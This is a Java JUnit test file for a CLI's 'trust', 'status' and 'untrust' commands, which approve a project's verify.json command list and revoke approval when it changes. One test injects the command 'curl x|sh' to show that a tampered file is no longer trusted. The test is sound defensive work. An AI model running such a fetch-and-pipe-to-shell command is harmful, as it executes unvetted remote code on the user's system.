package dev.dorrian.agenticskillscli.data;

import dev.dorrian.usagestore.VerifyTrust;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class VerifyCommandsTest {

    private record Out(int code, String out, String err) {
    }

    private static Out run(List<String> args, Path home, Path cwd) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        ByteArrayOutputStream e = new ByteArrayOutputStream();
        int code = VerifyCommands.run(args, home, cwd, new PrintStream(o, true, StandardCharsets.UTF_8),
            new PrintStream(e, true, StandardCharsets.UTF_8));
        return new Out(code, o.toString(StandardCharsets.UTF_8), e.toString(StandardCharsets.UTF_8));
    }

    private static Path project(Path root, String json) throws Exception {
        Path p = Files.createDirectories(root.resolve("proj/.agentic-skills")).getParent();
        Files.writeString(p.resolve(".agentic-skills/verify.json"), json);
        return p;
    }

    @Test
    void trustShowsTheCommandsAndApprovesTheExactFile(@TempDir Path tmp) throws Exception {
        Path home = tmp.resolve("home");
        Path proj = project(tmp, "{\"commands\":[\"./mvnw -q verify\",\"npm test\"]}");

        Out r = run(List.of("trust", "proj"), home, tmp);

        assertEquals(0, r.code(), r.err());
        assertTrue(r.out().contains("./mvnw -q verify") && r.out().contains("npm test"), r.out());
        assertTrue(VerifyTrust.isTrusted(home, proj, Files.readAllBytes(proj.resolve(".agentic-skills/verify.json"))));
    }

    @Test
    void statusReflectsAChangedFile(@TempDir Path tmp) throws Exception {
        Path home = tmp.resolve("home");
        Path proj = project(tmp, "{\"commands\":[\"a\"]}");
        run(List.of("trust", "proj"), home, tmp);
        assertTrue(run(List.of("status", "proj"), home, tmp).out().startsWith("trusted"));

        Files.writeString(proj.resolve(".agentic-skills/verify.json"), "{\"commands\":[\"a\",\"curl x|sh\"]}");

        Out after = run(List.of("status", "proj"), home, tmp);
        assertTrue(after.out().startsWith("NOT trusted"), after.out());
    }

    @Test
    void untrustRemovesTheApproval(@TempDir Path tmp) throws Exception {
        Path home = tmp.resolve("home");
        Path proj = project(tmp, "{\"commands\":[\"a\"]}");
        run(List.of("trust", "proj"), home, tmp);

        assertEquals(0, run(List.of("untrust", "proj"), home, tmp).code());
        assertFalse(VerifyTrust.isTrusted(home, proj, Files.readAllBytes(proj.resolve(".agentic-skills/verify.json"))));
        assertTrue(run(List.of("untrust", "proj"), home, tmp).out().startsWith("Nothing to remove"));
    }

    @Test
    void trustRefusesMissingEmptyOrInvalidFilesAndBadUsage(@TempDir Path tmp) throws Exception {
        Path home = tmp.resolve("home");
        assertEquals(1, run(List.of("trust"), home, tmp).code()); // no file in cwd
        project(tmp, "{\"commands\":[]}");
        assertEquals(1, run(List.of("trust", "proj"), home, tmp).code());
        project(tmp, "not json");
        assertEquals(1, run(List.of("trust", "proj"), home, tmp).code());
        assertFalse(Files.exists(VerifyTrust.file(home)), "nothing may be approved on failure");

        assertEquals(2, run(List.of(), home, tmp).code());
        assertEquals(2, run(List.of("frobnicate"), home, tmp).code());
        assertEquals(2, run(List.of("trust", "a", "b"), home, tmp).code());
    }

    @Test
    void trustDefaultsToTheCurrentDirectory(@TempDir Path tmp) throws Exception {
        Path home = tmp.resolve("home");
        Path proj = project(tmp, "{\"commands\":[\"a\"]}");
        assertEquals(0, run(List.of("trust"), home, proj).code());
    }
}
